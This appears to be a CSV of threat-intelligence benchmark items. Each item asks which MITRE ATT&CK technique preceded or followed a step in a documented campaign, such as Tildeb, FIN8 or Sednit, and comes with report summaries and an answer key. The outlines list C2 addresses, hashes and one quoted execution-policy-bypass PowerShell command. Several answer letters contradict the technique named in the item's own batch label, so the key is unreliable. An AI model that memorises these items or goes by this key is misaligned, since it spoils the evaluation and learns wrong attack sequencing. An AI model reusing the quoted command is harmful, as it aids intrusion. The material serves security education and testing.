Question ID,AttackSeq ID,Batch ID,Question,A,B,C,D,CTI Outline,Answer
1464,288,288-Command and Control-T1105-Ingress Tool Transfer,"After Tildeb uses encrypted communication with its C&C server via a modified SHA-1 hashing algorithm to establish session keys, which ATT&CK technique most likely occurred before the Command and Control phase to deploy additional tools for malicious activities?",T1078.002-Domain Accounts,T1105-Ingress Tool Transfer,T1070-Indicator Removal,T1104-Multi-Stage Channels,"Execution: The implant, identified as Tildeb, is a 32-bit console Windows executable named clocksvc.exe, which accepts command-line arguments and was compiled on October 3, 2000. It utilizes the MFC library, specifically mfc42.dll, for network communications and is compiled using Microsoft Visual C++ v6.0. Tildeb does not employ obfuscation techniques such as anti-disassembly, anti-debugging features, or encrypted strings. The implant can operate with various command-line arguments to establish communication with its C&C server using a hardcoded IP address and port, or alternative IP/domain and ports provided as arguments. It also has a capability to listen on a TCP socket for incoming connections and can attempt privilege elevation to inject code into a Microsoft Exchange Server process.
Defense Evasion: Tildeb lacks persistence mechanisms and is designed to clean up after itself if it does not receive data from the C&C server or encounters specific failures. It includes a cleanup thread that triggers a cleanup process under certain conditions, such as a lack of communication from the C&C server or failure to create a process. The cleanup process involves closing handles, deleting temporary files, shutting down sockets, and terminating the process.
Others: The implant Tildeb is associated with the moniker 'PATROLWAGON,' which is likely a reference to an unknown exploitation framework or tool. Tildeb's delivery method is not specified, but it may be distributed via lateral movement or other exploitation frameworks with RCE modules targeting Windows NT. The implant's hardcoded IP address contains a formatting error that affects its connectivity on different versions of Windows OS. Tildeb supports various control commands for malicious activities, including file deletion, file upload, directory listing, registry value modification, and code injection into Microsoft Exchange Server processes. It uses mailslots for interprocess communication and has specific routines for injecting code into Exchange Server processes. The implant attempts to exploit an unknown privilege escalation vulnerability in the win32k.sys driver on systems with specific locale settings.",D
2812,80,80-Persistence-T1547-Boot or Logon Autostart Execution,"After using the Hi-Zor RAT's method of double XOR encoding for command and control communication, which ATT&CK technique most likely occurred before it entrenched itself in the registry run key with 'regsvr32.exe' for persistence?",T1052.001-Exfiltration over USB,T1547.010-Port Monitors,T1027-Obfuscated Files or Information,T1547-Boot or Logon Autostart Execution,"Execution: The Hi-Zor RAT, identified in the INOCNATION campaign, executes processes, establishes a reverse shell, manages files, and has upload/download capabilities. It also includes a kill switch/uninstall feature.
Defense Evasion: Hi-Zor RAT uses string-stacking, a technique seen in Etumbot and Ixeshe families, and double XOR encoding for command and control communication. It also uses common applications, such as VPN installers, as decoys, a tactic observed in Sakula.
Command and Control: Hi-Zor RAT sends a victim's Volume Serial Number information in the beacon and communicates over a secure connection (e.g., TLS).
Others: The Fidelis Threat Advisory #1020 provides a detailed analysis of the Hi-Zor RAT, including new indicators and an updated Yara rule for detection. The Hi-Zor RAT is considered a new variant distinct from Sakula based on differences in code, network traffic, string obfuscation, file type, registry entrenchment, and embedded files. The webinar 'Dissecting the Malware Involved in the INOCNATION Campaign' is scheduled to further discuss the investigation.",A
2116,364,364-Resource Development-T1588-Obtain Capabilities,"Before command and control activities were observed using frameworks like Cobalt Strike Team Servers and TrickBot, which ATT&CK technique most likely facilitated the acquisition and preparation of malware and other necessary components for building the malicious infrastructure?",T1098.004-SSH Authorized Keys,T1586.002-Email Accounts,T1588-Obtain Capabilities,T1105-Ingress Tool Transfer,"Initial Access: Before a server can be used maliciously by a threat actor, it must be acquired through compromise or legitimate purchase. The software is then installed, configurations are tuned, SSL certificates are registered, and files are added to the server. The actors access it via panel login, SSH, or RDP, and expose the malware controller on a port to allow data transfer from the victim and to administer commands to infections.
Command and Control: Recorded Future observed over 10,000 unique C2 servers in 2021, with Cobalt Strike Team Servers and botnet families applying more resiliency and stealth measures. The most commonly observed C2 families were Cobalt Strike Team Servers, Meterpreter, Metasploit, QakBot, and TrickBot. The study also noted that 25% of detected servers were not referenced in open sources and were only identified on the Recorded Future Command and Control source. An average of a 35-day lead time was observed between when a C2 server is detected by scanning efforts and when it is reported in other sources.
Others: Recorded Future anticipates further insulation and modification of C2 servers in 2022 to avoid detection. TrickBot operators have hardened their infrastructure, and similar methods are expected to be employed by Cobalt Strike users. The C2 environment is expected to diversify, with new malware families and C2 frameworks likely to be aware of threat intelligence measures. Mitigations include using the Recorded Future Platform to identify actively exploited vulnerabilities, keeping systems and software up to date, implementing multi-factor authentication for remote access services, password-protecting sensitive files, and employing detection-in-depth methodologies.",C
1960,345,345-Initial Access-T1078-Valid Accounts,"After using exported saved passwords from users' Chrome browser installations for Credential Access, which ATT&CK technique most likely occurred before StellarParticle demonstrated persistence using credential hopping and creating new O365 Service Principals?",T1136-Create Account,T1078.002-Domain Accounts,T1560.002-Archive via Library,T1078-Valid Accounts,"Persistence: The StellarParticle campaign demonstrated persistence by using credential hopping, where different credentials were leveraged for each step while moving laterally through the victim's network. They also used accounts with Delegated Administrator rights to access other O365 tenants and create persistence within the environment. TrailBlazer malware was configured for WMI persistence, and GoldMax malware was configured for persistence via a crontab entry. The threat actor added credentials to O365 Service Principals and created new O365 Service Principals to maintain access to victim's environments.
Defense Evasion: The StellarParticle campaign involved defense evasion techniques such as stealing browser cookies to bypass multifactor authentication (MFA) and using renamed utilities to masquerade as legitimate system binaries. They also renamed their systems prior to connecting to victim's VPNs to match the victim's system naming convention.
Credential Access: The StellarParticle campaign involved various credential access techniques. They stole web session cookies from end-user workstations to access cloud resources and used both privileged and non-privileged accounts for RDP throughout the environment. They also used compromised service principals to make changes to the Office 365 environment and accessed data from Information Repositories.
Discovery: The threat actor used AdFind, standard PowerShell cmdlets, and custom tooling to identify various pieces of information from Active Directory. They regularly interrogated other systems using tasklist.exe and probed external services in an attempt to regain access to the environment.
Lateral Movement: The threat actor used both privileged and non-privileged accounts for RDP throughout the environment, depending on the target system.
Collection: The threat actor accessed data from Information Repositories.",D
2616,58,58-Privilege Escalation-T1053-Scheduled Task/Job,"After delivering the Flash exploit ""flash_video_x86.swf"" through a spear-phishing email to execute arbitrary code, which ATT&CK technique most likely occurred to maintain persistence on the victim's machine by leveraging elevated privileges?",T1221-Template Injection,T1053-Scheduled Task/Job,T1543.003-Windows Service,T1566-Phishing,"Initial Access: The Sednit espionage group, also known as APT28 or Fancy Bear, has been actively using a Flash exploit, identified as CVE-2015-5119, to target Eastern European institutions. This exploit was part of the Hacking Team data leak and allows attackers to execute arbitrary code remotely. The Sednit group's attack begins with a spear-phishing email containing a URL that mimics a legitimate domain, such as ""osce-press.org"". Upon visiting the URL, the victim's browser is directed to a landing page that collects detailed information about the computer. If the system meets the criteria set by the Sednit operators, the Flash exploit named ""flash_video_x86.swf"" is delivered. The exploit's decompiled code closely resembles the Hacking Team's version, with the main difference being the way the shellcode is received.
Persistence: If the Flash exploitation is successful, the victim's system receives a first-stage backdoor malware, which ensures the target is as intended. This malware includes the Hacking Team's Windows privilege escalation exploit. The Sednit group appears to have recompiled the source code of the exploit without altering its logic. Once the privilege escalation exploit is effective, the malware establishes persistence on the machine through a scheduled task that runs with the highest privileges.
Others: The Hacking Team data leak, which occurred over the weekend prior to July 10, 2015, involved more than 400GB of internal data, including business proposals and source code of the software sold by the company. The leaked data provided a complete exploitation chain for cyber attacks. ESET Research has urged users to upgrade their Flash software to mitigate the risks associated with these exploits. Indicators of Compromise (IoCs) have been identified, including the exploit kit domain name ""osce-press.org"", the Sednit Flash exploit with SHA1 hash D43FD6579AB8B9C40524CC8E4B7BD05BE6674F6C, the Sednit first-stage backdoor with SHA1 hash 51B0E3CD6360D50424BF776B3CD673DD45FD0F97, and the payload persistence script and file names ""fvecer.bat"" and ""api-ms-win-downlevel-profile-l1-1-0.dll"" with SHA1 hash B8B3F53CA2CD64BD101CB59C6553F6289A72D9BB.",B
1681,312,312-Initial Access-T1566-Phishing,"Before executing the PoisonIvy backdoor Trojan to establish communication with a C&C server over TCP port 80, which ATT&CK technique most likely occurred as attackers initiated their campaign to deliver malicious attachments?",T1074-Data Staged,T1566.002-Spearphishing Link,T1098.006-Additional Container Cluster Roles,T1566-Phishing,"Execution: Upon opening the malicious email attachment, the recipient inadvertently executed a file that installed PoisonIvy. This backdoor Trojan then contacted a C&C server using an encrypted communication protocol over TCP port 80. The attackers could then command the compromised computer to disclose its IP address, the names of other computers in the network, and Windows cached password hashes. The attackers used this access to traverse the network, infect additional computers, and ultimately aimed to obtain domain administrator credentials or access systems storing intellectual property.
Credential Access: The attackers leveraged the PoisonIvy Trojan to dump Windows cached password hashes from the compromised systems. This allowed them to potentially crack the passwords and gain unauthorized access to additional systems within the network.
Lateral Movement: The attackers used the credentials obtained from the compromised systems to move laterally within the network. Their goal was to find and access servers hosting sensitive intellectual property.
Collection: Once the attackers identified the desired intellectual property, they copied it to archives on internal systems that served as staging servers. This content was then prepared for exfiltration.
Command and Control: The PoisonIvy backdoor Trojan communicated with a C&C server over TCP port 80. The communication involved a handshake using an encryption algorithm, and the server would send binary code to be executed by the compromised system. Several C&C domains and IP addresses were identified, with some samples connecting directly to an IP address associated with a Chinese QQ user and antivirus-groups.com.
Exfiltration: The attackers uploaded the collected intellectual property from the internal staging servers to a remote site outside of the compromised organization, completing the attack.
Others: The Nitro Attacks targeted private companies in the chemical industry to steal intellectual property such as design documents, formulas, and manufacturing processes. The campaign began in late July 2011 and continued into mid-September 2011, with C&C servers used as early as April 2011. The attackers' geographic spread was wide, with infected machines located in the US, Bangladesh, the UK, and other countries. Attribution was traced back to a VPS in the US owned by a male located in the Hebei region of China, known as Covert Grove. The attacks used PoisonIvy, a RAT developed by a Chinese speaker. Other hacker groups also targeted the same chemical companies during this period, using malicious PDF and DOC files to drop variants of Backdoor.Sogu. The relationship between these groups is unclear.",B
2445,40,40-Defense Evasion-T1027-Obfuscated Files or Information,Which ATT&CK technique most likely occurred after DRAGONFISH used anti-virtual-machine features and obfuscation methods to exfiltrate data to the C2 server as part of its defense evasion strategy?,T1027-Obfuscated Files or Information,T1059.010-AutoHotKey & AutoIT,T1070.004-File Deletion,T1012-Query Registry,"Initial Access: The threat group DRAGONFISH, also known as Lotus Blossom, has been distributing a new variant of Elise malware through a malicious Microsoft Word document. The document, which contains information on ADMM-Plus members, embeds a malicious executable file as an OLE object. This file is dropped to the %temp% folder upon opening the document and is executed by exploiting the CVE-2017-11882 vulnerability. The payload is then moved to \AppData\Roaming\Microsoft\Windows\Caches\ as a file named NavShExt.dll, and the original executable is deleted.
Execution: The Elise malware initiates the following sequence of actions: it starts the Internet Explorer process (iexplore.exe) in a suspended state, injects the NavShExt.dll into the process, and calls the DLL's export function named 'Setting'. The process then continues to run in the background. The malware creates a mutex named 'donotbotherme' to prevent duplicate executions and stores harvested data in a file named thumbcache_1CD60.db located in AppData\Local\Microsoft\Windows\Explorer\. It also sends data to and downloads files and commands from a hardcoded C2 server with the IP address 103.236.150[.]14.
Persistence: Persistence is achieved by using the Run Registry key with the value name IAStorD located at HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IAStorD. Additionally, two hidden DLLs with export functions named DePatchEntry or EvilEntry are injected into iexplore.exe to provide loading and anti-analysis functionalities.
Discovery: The malware harvests extensive system information, including LAN and WAN IP addresses (using ipaddress.com for the latter), installed software list, proxy information, process enumeration via tasklist, and a list of all files on the user's desktop.
Command and Control: The malware communicates with a hardcoded C2 server with the IP address 103.236.150[.]14, sending harvested data and receiving files and commands.
Others: iDefense analysts have identified a campaign by the threat group DRAGONFISH targeting the ASEAN Defence Ministers' Meeting (ADMM) and associated individuals for espionage. The malware is capable of providing the attacker with a remote shell on the host and can completely uninstall itself. Execution debug messages are stored in the %temp% folder in a file named FXSAPIDebugLogFile.tmp, and logs are encrypted using a static AES key. To mitigate the threat, security teams are advised to block access to the C2 server and ensure the installation of Microsoft Security Update KB2553204 to patch the CVE-2017-11882 vulnerability. Analysts should look for artifacts such as a value named IAStorD in the autorun key, a file named FXSAPIDebugLogFile.tmp, a mutex handle named donotbotherme, and thumbcache_1CD60.db in AppData\Local\Microsoft\Windows\Explorer\.",A
1456,287,287-Command and Control-T1090-Proxy,Which ATT&CK technique most likely occurred after GADOLINIUM used open-source tools and cloud services for defense evasion to set up a malicious infrastructure that can be quickly established and dismantled?,T1546.007-Netsh Helper DLL,T1566-Phishing,T1008-Fallback Channels,T1090-Proxy,"Initial Access: In 2019, GADOLINIUM delivered malicious Access database files to targets via spear-phishing emails. The initial file was an Access 2013 database (.accde format) that dropped a fake Word document, an Excel spreadsheet, and a VBA dropper called mm.accdb.core, which executed a .NET DLL payload. In 2020, GADOLINIUM sent spear-phishing emails with malicious PowerPoint attachments related to COVID-19, which dropped a file named doc1.dotm.
Privilege Escalation: GADOLINIUM used tools like LazyCat, which includes privilege escalation and credential dumping capabilities, to enable lateral movement across victim networks. Microsoft Defender for Endpoint detects the privilege escalation technique used by LazyCat.
Defense Evasion: GADOLINIUM has been using cloud services and open-source tools to obfuscate their activity and make it difficult for analysts to track. They have used cloud-based technology to create a malicious infrastructure that can be quickly established and taken down before detection or given up at little cost.
Others: Microsoft Security tracks advanced threat actors like GADOLINIUM and shares findings to harden products and platforms. Microsoft suspended 18 Azure Active Directory applications part of GADOLINIUM's malicious C2 infrastructure, protecting customers transparently. GADOLINIUM, a nation-state activity group, has been compromising targets for nearly a decade, focusing on the maritime and health industries, and has expanded targeting to the Asia Pacific region, higher education, and regional government organizations. Microsoft's proactive defense measures include detecting individual attack components and preventing attackers from using cloud infrastructure to execute attacks.",B
372,148,148-Initial Access-T1566-Phishing,Which ATT&CK technique most likely occurred after the adversaries used weaponized exploit documents to establish initial access but before BBSRAT malware ensured persistence by writing to a registry key?,T1041-Exfiltration Over C2 Channel,T1566-Phishing,T1556.005-Reversible Encryption,T1078.003-Local Accounts,"Execution: The CTI report describes the execution process of the BBSRAT malware. Upon initial execution, the dropper generates a path in the %TEMP% directory and writes an embedded cab file. It then creates directories based on the Windows version and uses the expand.exe utility to write three files to the SSONSVR directory: aclmain.sdb, pnipcn.dll, and ssonsvr.exe. The legitimate Citrix executable ssonsvr.exe is used to sideload the malicious pnipcn.dll file, which then identifies the path to msiexec.exe, spawns a suspended instance of it, and performs process hollowing before resuming the process. To ensure persistence, a registry key is written to run ssonsvr.exe on startup.
Persistence: The BBSRAT malware ensures persistence by writing a registry key on the victim's machine to run the ssonsvr.exe file on startup. Additionally, the malware uses a downloader that deploys a DLL to either %SYSTEMROOT%\web\srvcl32.dll or %APPDATA%\web\srvcl32.dll, with corresponding registry keys set to ensure the DLL loads when Windows starts. This technique was previously used by the ZeroAccess rootkit.
Command and Control: The CTI report identifies the command and control (C2) infrastructure used by the BBSRAT malware. Analysis shows that the new samples used the same C2 domains as the 'Roaming Tiger' campaign, including transactiona[.]com and futuresgold[.]com. The C2 domains have significant overlap among the hashes and IPs, but the BBSRAT C2s contain no overlap, suggesting purpose-built variants and infrastructure for each target. BBSRAT communicates with the C2 server using HTTP or HTTPS requests and exfiltrates data about the victim's machine via POST requests.
Exfiltration: The BBSRAT malware exfiltrates data about the victim's machine to the C2 server using POST requests with a custom binary structure. The data is compressed using ZLIB and, if sent via HTTP, an additional encryption algorithm is applied.
Others: The CTI report mentions that despite public knowledge of their tactics, techniques, and procedures (TTPs), the adversaries continue to reuse much of their exposed playbook. Organizations are urged to use threat intelligence data proactively to secure themselves and prevent attacks. The report also includes a YARA rule for detecting BBSRAT and a list of identified BBSRAT samples with their associated C2 servers.",B
581,174,174-Discovery-T1069-Permission Groups Discovery,"After threat actors evaded defenses using Dumpert with API unhooking and a .NET loader, which ATT&CK technique most likely occurred before they moved laterally to other systems using dumped credentials through Impacket's atexec tool?",T1550-Use Alternate Authentication Material,T1546.005-Trap,T1069-Permission Groups Discovery,T1120-Peripheral Device Discovery,"Initial Access: On September 10, 2019, unknown threat actors exploited a vulnerability in SharePoint described in CVE-2019-0604 to install several webshells on the website of a Middle East government organization. One of these webshells is the open source AntSword webshell, similar to the China Chopper webshell.
Execution: The actors used the AntSword webshell to run a variety of commands on the compromised server for initial system and user discovery, as well as to ping systems of interest. They also uploaded tools to the server, including cURL, a custom Mimikatz variant, and compiled variants of Impacket's wmiexec and atexec tools.
Defense Evasion: The actors used a custom Mimikatz variant with a .NET loader to evade detection. Additionally, they uploaded the Dumpert tool, designed to evade antivirus and EDR solutions by using direct system calls and API unhooking.
Credential Access: The actors used Mimikatz to dump credentials from memory and Impacket tools to use the pass the hash technique to run commands on other systems.
Lateral Movement: Using the collection of webshells, the actors moved laterally to other systems on the network by dumping credentials with a variant of the notorious Mimikatz tool and using Impacket's atexec tool to use dumped credentials to run commands on other systems.
Command and Control: The actors used the AntSword webshell to communicate with the compromised server and run commands. They also used the AntSword Shell Manager to interact with the webshell.
Others: Palo Alto Networks customers are protected from the threat described in this report through Threat Prevention signatures for the exploits and C2 traffic as well as through WildFire. The CVE-2019-0604 vulnerability is covered by IPS signature Microsoft SharePoint Remote Code Execution Vulnerability (55411). The Awen Webshell and AntSword ASPX Webshell are detected by IPS signatures. The Mimikatz, Impacket atexec, and Dumpert tools are all marked with malicious verdicts by WildFire.",C
1015,230,230-Defense Evasion-T1027-Obfuscated Files or Information,Which ATT&CK technique most likely occurred after Gamaredon employed scripting through Batch files and VBScript to execute payloads and before registering modules as scheduled tasks for persistence?,T1129-Shared Modules,T1027-Obfuscated Files or Information,T1534-Internal Spearphishing,T1027.004-Compile After Delivery,"Initial Access: The Gamaredon group initiates attacks by sending spearphishing emails with malicious attachments to targets, leveraging trusted relationships by abusing compromised organization's email accounts to send emails with malicious attachments to the victim's contacts.
Execution: Gamaredon employs scripting, mostly Batch files and VBScript, and uses rundll32 to launch malicious DLLs, such as the C/C++ backdoor. They also use CreateProcess to launch additional components, like executing payloads from C&C servers, and rely on user execution of malicious email attachments for initial compromise.
Persistence: The group registers several modules as scheduled tasks for persistence and uses Registry Run keys and the Startup folder to ensure modules execute at every reboot. They also insert malicious macros into existing documents, providing persistence when they are reopened.
Discovery: The group's backdoors automatically list interesting files, such as Office documents, found on a system for future exfiltration.
Lateral Movement: Gamaredon injects malicious macros into all Word and Excel documents reachable by the compromised system and uses its Outlook VBA macro to send email with malicious attachments to other targets within the same organization.
Collection: Gamaredon's malware searches for sensitive documents on the local system and scans all drives, including removable drives and network shares mounted as drives, for sensitive data. They also have a backdoor that takes screenshots every minute and deploy scripts that automatically scan for interesting documents.
Command and Control: The group's malware uses both HTTP and HTTPS for command and control.
Exfiltration: Gamaredon's modules automatically upload harvested documents to the C&C server.
Others: The Gamaredon group has been active since at least 2013, mostly targeting Ukrainian institutions. They have increased activity in recent months with constant waves of malicious emails. The group uses a variety of programming languages and simple tools designed to gather sensitive information and spread further. They do not seem to make efforts to stay under the radar, focusing on spreading quickly and exfiltrating data. The group uses many different domains for C&C servers, both free and paid, and changes them frequently. They also use separate domains for small groups of victims. Despite errors in their tools, the group's rapid execution and adaptation create a state of constant dread in their targets. Persistence techniques include scheduled tasks, autorun registry keys, and leveraging the Startup folder. The group's strategy of installing multiple scripts and executables on each system and constantly updating them complicates defenders' efforts.",A
370,147,147-Discovery-T1482-Domain Trust Discovery,"After using system fingerprinting commands like systeminfo.exe and tasklist.exe, which ATT&CK technique most likely occurred to identify relationships between domains in the victim's network?",T1597.001-Threat Intel Vendors,T1482-Domain Trust Discovery,T1040-Network Sniffing,T1059-Command and Scripting Interpreter,"Initial Access: The FIN8 group, known for targeting retail, hospitality, and entertainment sectors, has been observed using a backdoor called BADHATCH to gain initial access to networks. The latest version of BADHATCH, v2.14, uses a malicious PowerShell command line to download and execute a script from a domain mapped by the sslip.io service, which is abused to evade detection. The script, identified by a hash value, employs base64 representations of shellcode for different architectures and uses a .NET binary to execute the shellcode in memory.
Execution: BADHATCH, once executed, can operate in two modes: CMD or POWERSHELL. In POWERSHELL mode, it launches powershell.exe with a command line that executes commands from a pipe using IEX. It supports custom commands such as info, Ping-Comp, Check-Port, Check-Share, psx, and GetComputerInfo. In CMD mode, it uses cmd.exe to execute a different set of commands, including spawn, proxy local, proxy bc, proxy status, ftp, steal, revert, and eventlog.
Persistence: FIN8 ensures persistence by using the WMI event subscription mechanism. A PowerShell script, indicated by the command line 'powershell.exe -nop -ep bypass -c c:\windows\temp\m.ps1 f9eef8b27ff68f41a8eb0b8739370640', sets up an event consumer named PerfData with a command line associated with it. This involves creating a WMI object named Win32_Base64Class with a property 'Prop' containing a base64 string of a .NET binary, which creates a svchost.exe process for code injection.
Privilege Escalation: The deployment of BADHATCH involves privilege escalation, as indicated by the execution of a script named sh-tmp.ps1, which likely escalates privileges since subsequent commands are executed on behalf of the SYSTEM user. The exact method of privilege escalation is not detailed, but it is associated with the use of the SYSTEM token and potentially involves impersonating tokens of processes like lsass.exe.
Defense Evasion: BADHATCH employs various defense evasion techniques, including the use of TLS encryption to conceal PowerShell commands and masquerading its communication with the C&C server as legitimate HTTP requests. It also uses a proxy to perform TLS encryption and redirection of decrypted data to the actual C&C application.
Credential Access: Credential dumping is suggested by the execution of a script named mimi.ps1, which is speculated to be related to Mimikatz. This is supported by telemetry data indicating that the PowerShell process read the memory of lsass.exe, which is a common target for credential dumping.
Lateral Movement: Lateral movement to the Domain Controller was achieved using wmic.exe to create a process on the DC and execute the BADHATCH deployment script. The output redirection to a local ADMIN$ share suggests the use of the wmiexec.py tool from Impacket.
Others: FIN8 has targeted victims in various countries, including the United States, Canada, South Africa, Puerto Rico, Panama, and Italy, across industries such as insurance, retail, technology, and chemicals. Bitdefender recommends separating POS networks, cybersecurity awareness training, integrating threat intelligence, and considering outsourcing security operations to Managed Detection and Response providers.",B
725,191,191-Discovery-T1012-Query Registry,"During Operation Sharpshooter, after establishing persistence by placing the second-stage binary in the startup folder, which ATT&CK technique most likely occurred before the Rising Sun implant communicated with control servers using HTTP POST requests?",T1059.001-PowerShell,T1012-Query Registry,T1497.001-System Checks,T1589-Gather Victim Identity Information,"Reconnaissance: The McAfee Advanced Threat Research team reported that Operation Sharpshooter masqueraded as legitimate industry job recruitment activity to gather information for potential exploitation. The campaign used similar techniques associated with other job recruitment campaigns. The malicious documents contained Korean-language metadata and English-language job description titles, indicating a focus on English-speaking targets or those with English-speaking regional offices. The majority of targets were defense and government-related organizations.
Initial Access: Operation Sharpshooter began on October 25 with a series of malicious documents authored by 'Richard' and distributed via an IP address in the United States and through Dropbox. These documents contained a malicious macro that injected the Sharpshooter downloader into the memory of Word, which then retrieved the second-stage implant Rising Sun from a control server.
Execution: The shellcode executed by the macro in winword.exe acted as a downloader for the Rising Sun implant. It resolved Libraries and APIs using LoadLibraryA() and GetProcAddress(), downloaded the second-stage payload and a decoy document to the startup folder and %LOCALAPPDATA% respectively, and executed both payloads using CreateProcessA() and ShellExecuteA().
Persistence: The Rising Sun implant ensured persistence on the system by downloading the second-stage binary to the startup folder during the download process, thereby removing the need for the implant to set up persistence for itself.
Command and Control: The Rising Sun implant communicated with control servers using HTTP POST requests, sending data in various formats encrypted with RC4 and obfuscated with Base64 encoding. The control servers identified were 34.214.99.20/view_style.php, 137.74.41.56/board.php, and kingkoil.com.sg/board.php.
Exfiltration: The Rising Sun implant encrypted data using the RC4 stream encryption algorithm and obfuscated it with Base64 encoding before exfiltrating it to the control server via HTTP POST requests.
Others: The McAfee Advanced Threat Research team discovered a new implant framework using code from the 2015 backdoor Duuzer, which was last seen targeting South Korea and Japan. The Rising Sun implant shares multiple similarities with Lazarus Group attacks but also raises the possibility of false flags. The campaign targeted nuclear, defense, energy, and financial companies globally, predominantly in the United States. The implant carries 14 backdoor capabilities, including executing commands, gathering drive and process information, reading and writing files, and modifying file attributes. Attribution to the Lazarus Group is suggested but not confirmed due to potential false flags.",B
951,222,222-Exfiltration-T1020-Automated Exfiltration,"After staging data by scanning for files matching specific extensions and creating a file containing paths of all files to exfiltrate during the Collection phase, which ATT&CK technique most likely occurred after the malware communicated with the C&C server over ports 80 or 443?",T1543.001-Launch Agent,T1113-Screen Capture,T1567.002-Exfiltration to Cloud Storage,T1020-Automated Exfiltration,"Initial Access: The Sednit group, also known as APT28, Fancy Bear, Sofacy, or STRONTIUM, launched a spearphishing email campaign at the end of August 2018, distributing shortened URLs that delivered the first stage of Zebrocy components. The campaign relied on social engineering to lure victims into running the first part of the chain. The URL led to an IP-address-based URL where the archived payload was located, containing an executable file and a decoy PDF document. The executable, when run, would prompt for a password and then open the decoy PDF, while the downloader written in Delphi continued to run in the background.
Execution: The Sednit group's operators took control of the backdoor and began sending commands immediately after the victim executed the downloader. The commands included taking screenshots, gathering system information, network scanning, and executing various system commands to collect data from the victim's computer. The operators used a Stage-1 downloader to download and execute a new downloader, written in C++, which then downloaded a Delphi backdoor. The backdoor's configuration was stored in the resource section, split into four different hex-encoded, encrypted blobs.
Persistence: The operators used COM object hijacking for persistence, adding registry keys for a custom backdoor that was executed using the CMD_EXECUTE command. This backdoor was installed only for a few hours and was removed quickly after its operators completed their tasks.
Defense Evasion: The Sednit group's malware deleted files (binaries and files created) after usage and killed processes to disable security tools.
Credential Access: The operators uploaded and used dumpers on victims' machines to target browsers and versions of Microsoft Outlook from 1997 through 2016. They retrieved databases related to credentials from software such as Firefox, The Bat! email client, and Opera.
Discovery: The operators gathered information about the victim's computer and environment, including registry keys enumeration, listing running processes, and using system commands to gather information about the victim.
Collection: The malware scanned for files matching specific extensions on the local system, network shared drives, and removable media. It staged data by creating a file containing paths of all files to exfiltrate and had features for input capture and screen capture.
Command and Control: The downloaders and backdoors communicated with the C&C server using commonly used ports 80 or 443. Data sent were hex-encoded and encrypted with AES or a custom algorithm. A fallback C&C server was embedded in the configuration.",D
